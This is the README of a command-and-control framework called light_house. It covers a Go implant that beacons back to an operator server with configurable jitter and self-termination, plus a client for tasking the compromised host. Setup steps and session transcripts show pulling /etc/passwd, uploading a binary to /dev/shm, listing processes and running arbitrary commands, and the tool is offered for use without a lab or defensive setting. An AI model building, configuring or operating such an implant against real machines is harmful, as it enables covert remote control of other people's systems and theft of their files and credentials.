# light_house
- LightHouse is in Alpha release, if you encounter an issue or have a suggestion, open an issue ticket or create a PR!
## Design
light_house is broken up into four general components
The python server called lighthouse, the go agent called galleon, the python client called merchant, and the sqlite database.
I am hoping to add more agents in the future with similar capabilities to the galleon agent.

## The Theme
The project has a nautical based theme for components. The theme for the agents is based on 15th-17th century ship classes.
````
Galleon: a sailing ship in use (especially by Spain) from the 15th through 17th centuries, originally as a warship,
later for trade. Galleons were mainly square-rigged and usually had three or more decks and masts.
````
## Setup
````
git clone https://github.com/ice-wzl/light_house.git
````
### Gelleon Agent Setup
````
cd agent
````
- Change the inital callback frequency (5 minutes default). If that is acceptable, you can ignore this step. You can always reconfigure the callback frequency once the galleon agent checks in with the lighthouse server.
- Callback_freq -> minutes
- Jitter is a "max cap percentage". Jitter will be randomized each callback between 1% and the value you have set for jitter (i.e. 15%). What that means is for each callback the expected jitter will be between 1 and 15% of the overall callback time.
- SelfTerminate is a max failed checkins. An error occurs if the galleon agent cannot reach the lighthouse server. Say the internet is out, or the lighthouse server is not running, that will count as an error. If the galleon agent is set to callback every 1 minute, and SelfTerminate is 20, the galleon agent will die in 20 minutes if it has failed to checkin with lighthouse.
````
# search for this line in galleon.go
    var callbackTimer = CallbackInfo{Callback_freq: 1, Jitter: 15, SelfTerminate: 20}
````
- Edit the ip address/domain you want the agent to call back to
````
# search for this line in galleon.go
	serverUrl := "http://192.168.15.172:8000"
````
- build agent
````
go build
#OR specific arch 
GOARCH=<arch> GOOS=<linux> go build
````
## Lighhouse Setup
````
python3 -m venv venv
cd server
````
- Setup virtual env
````
source ../venv/bin/activaate
pip3 install -r ../requirements.txt 
pip3 install uvicorn
# run the server
uvicorn lighthouse:app --reload
INFO:     Will watch for changes in these directories: ['/opt/light_house/server']
INFO:     Uvicorn running on http://127.0.0.1:8000 (Press CTRL+C to quit)
INFO:     Started reloader process [1100534] using StatReload
INFO:     Started server process [1100536]
INFO:     Waiting for application startup.
INFO:     Application startup complete.
````
- by default it will run the server on 127.0.0.1:8000
- to bind the server to another interface
````
uvicorn lighthouse:app --reload --host 0.0.0.0 --port 8000                                                               2 ↵
INFO:     Will watch for changes in these directories: ['/opt/light_house/server']
INFO:     Uvicorn running on http://0.0.0.0:8000 (Press CTRL+C to quit)
INFO:     Started reloader process [1101158] using StatReload
INFO:     Started server process [1101160]
INFO:     Waiting for application startup.
INFO:     Application startup complete.
````

## Merchant Client Setup
````
cd client
source ../venv/bin/activate 
python3 merchant.py -h
usage: merchant.py [-h] -u USERNAME -p PASSWORD -s SERVER

Client to connect to a server

options:
  -h, --help            show this help message and exit
  -u USERNAME, --username USERNAME
                        The username to authenticate with
  -p PASSWORD, --password PASSWORD
                        The password to authenticate with
  -s SERVER, --server SERVER
                        The listening post address
python3 merchant.py -u admin -p password -s 127.0.0.1:8000
````
- Above is the default username and password, I highly recommend you change that.
````
!server > user_add root <strong password here> 
[*] User created successfully
!server > users                                                                                                                   
+----+----------+------------------------+---------------------+
| ID | Username |        Password        |      Created At     |
+----+----------+------------------------+---------------------+
| 1  |  admin   |        password        | 2025-06-12 00:54:13 |
| 2  |   root   | <strong password here> | 2025-06-14 14:55:29 |
+----+----------+------------------------+---------------------+
!server > user_delete 1                                                                                                           
[*] User id 1 deleted
!server > users                                                                                                                   
+----+----------+------------------------+---------------------+
| ID | Username |        Password        |      Created At     |
+----+----------+------------------------+---------------------+
| 2  |   root   | <strong password here> | 2025-06-14 14:55:29 |
+----+----------+------------------------+---------------------+
````
## Server Basics 
- View established sessions
````
sessions                                                                                                                
+----------+-------+---------------------+---------------------+------------+------+----------+
| Session  | Alive |      Last Seen      |      First Seen     | CB Freq(m) | User | Hostname |
+----------+-------+---------------------+---------------------+------------+------+----------+
| a3eb41eb |  True | 2025-06-14 15:00:08 | 2025-06-14 15:00:08 |     1      | root |  debian  |
+----------+-------+---------------------+---------------------+------------+------+----------+
````
- exit the server
````
!server > quit                                                                                                                    
[*] Goodbye...
````
- drop into the session context (leave the server context)
````
!server > interact a3eb41eb                                                                                                       
!session >  
````
- from the session context you can issue tasking to the agent 
- view basic session info 
````
!session > info                                                                                                                   
+----------+-------+---------------------+---------------------+------------+------+----------+
| Session  | Alive |      Last Seen      |      First Seen     | CB Freq(m) | User | Hostname |
+----------+-------+---------------------+---------------------+------------+------+----------+
| a3eb41eb |  True | 2025-06-14 15:01:11 | 2025-06-14 15:00:08 |     1      | root |  debian  |
+----------+-------+---------------------+---------------------+------------+------+----------+
````
- view directory listing 
````
!session > ls /                                                                                                                   
[*] Tasking successfully sent
````
- view taking object
````
!session > tasking                                                                                                                
+----+----------+---------------------+------+------+----------+
| ID | Session  |      Date Sent      | Task | Args | Complete |
+----+----------+---------------------+------+------+----------+
| 1  | a3eb41eb | 2025-06-14 15:02:02 |  ls  |  /   |   True   |
+----+----------+---------------------+------+------+----------+
````
- view results of tasking object
````
!session > view 1                                                                                                                 
+----+----------+---------------------+------+------+
| ID | Session  |    Date Received    | Task | Args |
+----+----------+---------------------+------+------+
| 1  | a3eb41eb | 2025-06-14 15:02:13 |  ls  |  /   |
+----+----------+---------------------+------+------+
dtrwxrwxrwx     2025-06-14T09:18:47Z   4096       tmp                 
drwxr-xr-x      2025-04-27T22:55:50Z   4096       home                
Lrwxrwxrwx      2024-09-11T07:26:49Z   7          lib                 
drwxr-xr-x      2025-06-14T14:56:37Z   460        run                 
dr-xr-xr-x      2025-05-04T17:00:28Z   0          proc                
drwxr-xr-x      2024-09-11T07:26:53Z   4096       opt                 
drwxr-xr-x      2024-09-11T07:26:53Z   4096       mnt                 
drwx------      2025-06-12T05:10:32Z   4096       root                
drwxr-xr-x      2024-09-11T07:26:53Z   4096       media               
Lrwxrwxrwx      2024-09-11T07:26:49Z   8          sbin                
drwxr-xr-x      2024-09-11T07:26:53Z   4096       var                 
drwxr-xr-x      2025-05-04T17:00:28Z   480        dev                 
Lrwxrwxrwx      2024-09-11T07:26:49Z   9          lib64               
dr-xr-xr-x      2025-05-04T17:00:28Z   0          sys                 
drwxr-xr-x      2025-06-14T06:07:52Z   4096       etc                 
drwxr-xr-x      2024-09-11T07:27:17Z   4096       usr                 
drwxr-xr-x      2024-09-11T07:26:53Z   4096       srv                 
Lrwxrwxrwx      2024-09-11T07:26:49Z   7          bin                 
drwxr-xr-x      2024-08-14T16:10:00Z   4096       boot                
drwx------      2025-04-27T22:51:20Z   16384      lost+found         
````
- pull a process list (no arguments required/available)
````
!session > view 2                                                                                                                 
+----+----------+---------------------+------+------+
| ID | Session  |    Date Received    | Task | Args |
+----+----------+---------------------+------+------+
| 2  | a3eb41eb | 2025-06-14 15:03:14 |  ps  |      |
+----+----------+---------------------+------+------+
PID      PPID     CMDLINE
1        0        /sbin/init 
50       1        /lib/systemd/systemd-journald 
90       1        /usr/sbin/cron -f 
91       1        dhclient -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0 
--snip--
````
- download file from remote host
````
download /etc/passwd                                                                                                   
[*] Tasking successfully sent

view 3                                                                                                                 
+----+----------+---------------------+----------+-------------+
| ID | Session  |    Date Received    |   Task   |     Args    |
+----+----------+---------------------+----------+-------------+
| 3  | a3eb41eb | 2025-06-14 15:04:20 | download | /etc/passwd |
+----+----------+---------------------+----------+-------------+
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
--snip--
````

- upload file to remote host
````
# get your source file 
ls -la goum_client; md5sum goum_client 
-rwxrwxr-x 1 ubuntu ubuntu 6937392 Jun 14 11:07 goum_client
cfc650f25e2ba6a36d77c29425d1fac9  goum_client

# argument order-> src file -> dest file
upload /tmp/goum_client /dev/shm/goum_client                                                                          
[*] Tasking successfully sent
session > ls /dev/shm                                                                                                           
[*] Tasking successfully sent
!session > view 6                                                                                                                
+----+----------+---------------------+------+----------+
| ID | Session  |    Date Received    | Task |   Args   |
+----+----------+---------------------+------+----------+
| 6  | a3eb41eb | 2025-06-14 15:10:58 |  ls  | /dev/shm |
+----+----------+---------------------+------+----------+
---x-----x      2025-06-14T15:09:48Z   6937392    goum_client  
````
- run arbitratry command on the remote host, capturing stdout,stderr. In this case we want to confirm the md5sum matches src file to dest file after the upload operation
````
exec_fg "md5sum /dev/shm/goum_client"                                                                      
[*] Tasking successfully sent
--snip--
| 8  | a3eb41eb | 2025-06-14 15:15:01 | exec_fg  |      md5sum /dev/shm/goum_client       |   True   |
+----+----------+---------------------+----------+----------------------------------------+----------+
!session > view 8                                                                                                                
+----+----------+---------------------+---------+-----------------------------+
| ID | Session  |    Date Received    |   Task  |             Args            |
+----+----------+---------------------+---------+-----------------------------+
| 8  | a3eb41eb | 2025-06-14 15:15:13 | exec_fg | md5sum /dev/shm/goum_client |
+----+----------+---------------------+---------+-----------------------------+
cfc650f25e2ba6a36d77c29425d1fac9  /dev/shm/goum_client
````
- run command in background NOT capturing output, and running as a child process of galleon 
````
exec_bg "sleep 200"                                                                                                   
[*] Tasking successfully sent
# from seperate ssh session for clarity 
0 S root       35931   35905  0  80   0 - 451657 futex_ 11:00 pts/3   00:00:00  |       \_ ./galleon
0 S root       35973   35931  0  80   0 -  1367 hrtime 11:17 pts/3    00:00:00  |           \_ sleep 200
````



